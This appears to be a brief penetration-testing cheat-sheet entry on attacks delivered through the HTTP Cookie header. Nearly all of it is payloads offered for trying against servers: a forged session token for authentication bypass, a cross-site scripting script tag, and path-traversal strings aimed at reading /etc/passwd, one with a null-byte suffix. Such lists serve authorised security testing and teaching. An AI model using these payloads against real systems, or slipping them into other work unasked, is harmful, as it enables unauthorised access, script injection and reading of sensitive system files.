++Cookie header attacks:++ 

Can sometimes be used for auth bypassing:
Cookie: SessionToken=anything

Just play around with, sometimes the server can expect an LFI even through it, see responses
Cookie: name=<script>alert(document.domain)</script>
Cookie: name=../../../../../../../../etc/passwd
Cookie: name=../../../../../../../../etc/passwd%00

